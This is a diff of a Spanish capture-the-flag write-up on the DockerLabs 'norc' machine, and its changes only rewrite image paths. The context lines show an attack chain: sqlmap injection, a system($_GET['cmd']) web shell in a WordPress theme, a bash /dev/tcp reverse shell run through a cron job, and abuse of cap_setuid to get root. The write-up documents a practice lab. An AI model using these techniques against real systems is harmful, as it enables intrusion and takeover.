@@ -5,7 +5,7 @@ permalink: /norc-dockerlabs-writeup/
 date: 2025-11-07
 pin: false
 image:
- path: /assets/images/posts/DockerLabs/norc/norc.png
+ path: /assets/img/posts/DockerLabs/norc/norc.png
 tags:
   - linux
   - hard
@@ -39,9 +39,9 @@ hide_title_image: true # Añade esta línea
 
 
 #header:
-  #overlay_image: /assets/images/posts/DockerLabs/norc/norc.png
+  #overlay_image: /assets/img/posts/DockerLabs/norc/norc.png
   #overlay_filter: 0.7
-  #og_image: /assets/images/posts/DockerLabs/norc/norc.png
+  #og_image: /assets/img/posts/DockerLabs/norc/norc.png
 #toc_label: Topics
 #toc_sticky: true
 #sidebar:
@@ -58,7 +58,7 @@ hide_title_image: true # Añade esta línea
 
 ### Lanzamiento laboratorio
 
-![DockerLabs](/assets/images/posts/DockerLabs/norc/docker1.png){: .align-center}
+![DockerLabs](/assets/img/posts/DockerLabs/norc/docker1.png){: .align-center}
 
 Se procede a lanzar el docker sobre la maquina a vulnerar con numero de ip --> 172.17.0.2
 
@@ -112,8 +112,8 @@ bash
 nmap -p- --open --min-rate=5000 -sS -v -Pn -n -A 172.17.0.2 -oX nmap.xml
 ```
 
-![Nmap](/assets/images/posts/DockerLabs/norc/nmap.png){: .align-center}
-![Nmap_2](/assets/images/posts/DockerLabs/norc/nmap2.png){: .align-center}
+![Nmap](/assets/img/posts/DockerLabs/norc/nmap.png){: .align-center}
+![Nmap_2](/assets/img/posts/DockerLabs/norc/nmap2.png){: .align-center}
 
 | Puerto 22/tcp | Servicio: ssh | Versión: OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)  
 | Puerto 80/tcp | Servicio: tcp | Version: Apache httpd 2.4.59 ((Debian))   
@@ -147,7 +147,7 @@ Nmap done: 1 IP address (1 host up) scanned in 7.25 seconds
 ```
 
 
-![URL](/assets/images/posts/DockerLabs/norc/url_local.png){: .align-center}
+![URL](/assets/img/posts/DockerLabs/norc/url_local.png){: .align-center}
 Se esta aplicando una redireccion a norc.labs y no consigue resolver debido a la falta de la informacion en el archivo /etc/hosts.
 ```bash
 echo '127.17.0.2\tnorc.labs' | sudo tee -a /etc/hosts
@@ -288,7 +288,7 @@ Para verificar si existían vulnerabilidades conocidas en la infraestructura det
 En la siguiente foto se puede ver como se intenta un acceso pero automaticamente dice que solo quedan 2 intentos, es decir que el panel cuenta con contramedidas para la fuerza bruta.
 
 
-![Wordpress](/assets/images/posts/DockerLabs/norc/wordpres2.png){: .align-center}
+![Wordpress](/assets/img/posts/DockerLabs/norc/wordpres2.png){: .align-center}
 
 
 
@@ -329,7 +329,7 @@ sudo sqlmap --dbms=mysql -u "http://norc.labs/wp-login.php" --cookie='wordpress_
 
 Debido a que tarda mucho esta explotacion decido buscar la estructura de wordpress para poder ir directo a las columnas que requiero.
 
-![Wordpress](/assets/images/posts/DockerLabs/norc/wordpres1.png){: .align-center}
+![Wordpress](/assets/img/posts/DockerLabs/norc/wordpres1.png){: .align-center}
 
 
 
@@ -361,7 +361,7 @@ La contraseña obtenida fue utilizada exitosamente para la **autenticación admi
 
 
 
-![Credenciales](/assets/images/posts/DockerLabs/norc/credentials_1.png){: .align-center}
+![Credenciales](/assets/img/posts/DockerLabs/norc/credentials_1.png){: .align-center}
 
 ### 3.3. Establecimiento de Ejecución Remota de Código (RCE)
 
@@ -374,7 +374,7 @@ system($_GET['cmd'])
 ```
 
 
-![CMD_RCE](/assets/images/posts/DockerLabs/norc/cmd.png){: .align-center}
+![CMD_RCE](/assets/img/posts/DockerLabs/norc/cmd.png){: .align-center}
 
 
 La **Ejecución Remota de Código (RCE)** se confirmó inmediatamente mediante la ejecución del comando `id` a través del navegador:
@@ -387,7 +387,7 @@ http://norc.labs/wp-content/themes/twentytwentytwo/functions.php?cmd=id
 Navegando a `http://norc.labs/wp-content/themes/twentytwentytwo/functions.php?cmd=id`
 Confirmé que podía ejecutar comandos en el sistema.
 
-![ID](/assets/images/posts/DockerLabs/norc/id.png){: .align-center}
+![ID](/assets/img/posts/DockerLabs/norc/id.png){: .align-center}
 
 
 **URL** encodeada para consegir *acceso* remoto:
@@ -399,7 +399,7 @@ Como metodología alternativa al ataque de inyección directa en el tema (`funct
 
 1. **Carga del Plugin:** Se utilizó la función de carga de plugins del panel de administración de WordPress para subir un _plugin_ preexistente que contenía una _reverse shell_ (`reverse-shell-v1.4.0.zip`).
 
-![Plugin Upload](/assets/images/posts/DockerLabs/norc/plugin2.png){: .align-center}   
+![Plugin Upload](/assets/img/posts/DockerLabs/norc/plugin2.png){: .align-center}   
     
 2. **Activación y Ejecución:** Tras la carga y activación del _plugin_ "rev shell", la conexión de _reverse shell_ se iniciaba al acceder a la URL del _plugin_ inyectado, proporcionando una consola interactiva al atacante.
 
@@ -416,7 +416,7 @@ Tras obtener la Ejecución Remota de Código (RCE) como el usuario de baja prior
 
 Inicialmente, se intentó utilizar la metodología de inyección de código mediante la carga de un _plugin_ de _reverse shell_ pre-construido.
 
-![Plugin Upload](/assets/images/posts/DockerLabs/norc/plugin.png){: .align-center}  
+![Plugin Upload](/assets/img/posts/DockerLabs/norc/plugin.png){: .align-center}  
 
 Debido a problemas de inestabilidad y cierres inesperados de la consola, se optó por la técnica de _backdoor_ directa en el código del tema (`functions.php`), ya implementada para el RCE, asegurando una conexión más fiable y controlada para la fase de post-explotación.
 [GitHub Plugin Rev Shell para Wordpress](https://github.com/4m3rr0r/Reverse-Shell-WordPress-Plugin/blob/main/reverse-shell.php)
@@ -424,7 +424,7 @@ Debido a problemas de inestabilidad y cierres inesperados de la consola, se opt�
 Y al final se consiguio el RevShell con el metodo atenrior de modificar el Plugin:
 
 
-![Plugin](/assets/images/posts/DockerLabs/norc/plugin2.png){: .align-center}
+![Plugin](/assets/img/posts/DockerLabs/norc/plugin2.png){: .align-center}
 
 
 ## 5. Post-Exploitation y Preparación para la Escalada de Privilegios
@@ -464,7 +464,7 @@ El análisis reveló dos hallazgos de alto riesgo que constituían la cadena de 
 2. **Abuso de Capabilities (Escalada a `root`):** Configuración de _capabilities_ elevadas (`cap_setuid`) en el binario de Python.
 [LinPeas.sh GitHub](https://github.com/peass-ng/PEASS-ng/blob/master/linPEAS/README.md)
 
-![Linpeas](/assets/images/posts/DockerLabs/norc/linpeas.png){: .align-center}
+![Linpeas](/assets/img/posts/DockerLabs/norc/linpeas.png){: .align-center}
 
 
 ## 6. Privilege Escalation (Parte 1): Explotación del Cron Job
@@ -475,7 +475,7 @@ La primera etapa de la escalada de privilegios se logró explotando una tarea pr
 
 Expuesto el codigo y dejandonos ver su funcionamiento para posterior realizar la modificacion y beneficio en la escalada de privilegios como muestra la siguiente captura de pantalla. 
 
-![Script](/assets/images/posts/DockerLabs/norc/script1.png){: .align-center}
+![Script](/assets/img/posts/DockerLabs/norc/script1.png){: .align-center}
 El uso de eval sin tratamiento adecuado en un script cron representa una vulnerabilidad crítica. Permite ejecutar comandos arbitrarios si se controla el contenido del archivo **‘/var/www/html/.wp-encrypted.txt’**.
 
 
@@ -499,7 +499,7 @@ como se realizo la codificacion del comando **/bin/bash -c 'bash -i >& /dev/tcp/
 dejando por ultimo a la ventana de abajo a la derecha con el acceso como el usuario **kvzlx**
 
 
-![Up_1](/assets/images/posts/DockerLabs/norc/up_1.png){: .align-center}
+![Up_1](/assets/img/posts/DockerLabs/norc/up_1.png){: .align-center}
 
 Tras esperar el intervalo de ejecución programado del Cron Job (típicamente un minuto), la carga útil se ejecutó con éxito. Esto resultó en una nueva conexión de _reverse shell_ en el puerto 4444.
 
@@ -524,7 +524,7 @@ Bash
 find / -type f 2>/dev/null|xargs /sbin/getcap -r 2>/dev/null|grep cap_setuid=ep
 ```
 
-![Wordpress](/assets/images/posts/DockerLabs/norc/find1.png){: .align-center}
+![Wordpress](/assets/img/posts/DockerLabs/norc/find1.png){: .align-center}
 Este escaneo reveló que el binario del intérprete de Python (`/opt/python3`) tenía la _capability_ **`cap_setuid+ep`** configurada. Esta configuración es un fallo de seguridad crítico, ya que permite al binario **cambiar su ID de usuario efectivo** a cualquier ID, incluyendo **cero (root)**, sin requerir una contraseña.
 
 ### 7.2. Abuso de la Capability `cap_setuid`
@@ -557,7 +557,7 @@ root
 ```
 
 
-![Root](/assets/images/posts/DockerLabs/norc/root.png){: .align-center} 
+![Root](/assets/img/posts/DockerLabs/norc/root.png){: .align-center} 
 
 
 ## 8. ⛓️ Cadena de Ataque (Attack Kill Chain)
